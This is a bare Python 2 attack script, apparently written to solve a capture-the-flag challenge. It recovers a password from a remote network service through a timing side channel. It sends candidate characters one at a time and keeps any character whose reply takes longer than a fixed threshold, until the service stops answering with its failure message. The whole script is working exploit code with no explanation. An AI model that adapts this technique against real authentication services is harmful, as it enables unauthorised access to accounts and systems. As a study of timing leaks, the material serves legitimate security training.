#!/usr/bin/python
import socket
import time
port = 10101
host = "foo.airane.ninja"
bad = "no pain no gain, try again"
response = bad
password = list()

while(bad in response):
	#iterate ASCII
	for i in xrange(32, 126):
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((host, port))
		#skip banner
		client.recv(64)
		#start timer
		t1 = time.time()
		client.send(''.join(password) + chr(i) + "\x00")
		response = client.recv(64)
		#stop timer
		t2 = time.time()
		diff = t2-t1
		print ("test : %s time : %f")%(chr(i),diff)
		if(diff>1.2):
			password.append(chr(i))
			print ''.join(password)
			print response
			break